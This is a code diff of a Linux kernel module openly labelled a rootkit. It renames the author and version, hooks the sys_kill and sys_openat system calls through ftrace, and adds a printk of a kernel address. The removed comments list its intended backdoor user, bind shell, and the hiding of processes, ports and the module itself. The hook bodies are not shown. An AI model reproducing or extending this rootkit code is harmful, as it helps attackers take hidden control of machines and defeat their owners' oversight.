@@ -1,38 +1,33 @@
-#include "includes.h"
+#include "common.h"
 #include "ftrace_helper.h"
-#include "csysFn/functions.h"
+#include "functions.h"
 
 MODULE_LICENSE("GPL");
-MODULE_AUTHOR("Burr");
-MODULE_DESCRIPTION("Burr's Rootkit");
-MODULE_VERSION("1.00");
+MODULE_AUTHOR("James Walker");
+MODULE_DESCRIPTION("Rootkit Project");
+MODULE_VERSION("1.10");
 
 struct ftrace_hook hooks[] = {
-    HOOK("sys_kill", hookKill, &ogKill)
+    HOOK("sys_kill", killHook, &killOG),
+    HOOK("sys_openat", hookOpenAt, &ogOpenAt)
 };
 
 static int __init load(void) {
-    //Create backdoor user
-    //Create backdoor bind shell
-    //Chmod, Chattr, NoClobber and Mount Bind root folder
-    //Hide rootkit
-    //Hide process
-    //Hide listening port
-    //Hide bind shell
-    //Hook sys_write
-    int err;
-    err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
-    if (err)
+    int err = fh_install_hooks(hooks, ARRAY_SIZE(hooks));
+    printk(KERN_INFO "%p", &killOG);
+    if (err) {
+        printk(KERN_DEBUG "fh_install_hooks failed; %d\n", err);
         return err;
+    }
     printk(KERN_INFO "Hello world!\n");
     return 0;
-}
+};
 
 static void __exit unload(void) {
     fh_remove_hooks(hooks, ARRAY_SIZE(hooks));
     printk(KERN_INFO "Goodbye world!\n");
     return;
-}
+};
 
 module_init(load);
 module_exit(unload);
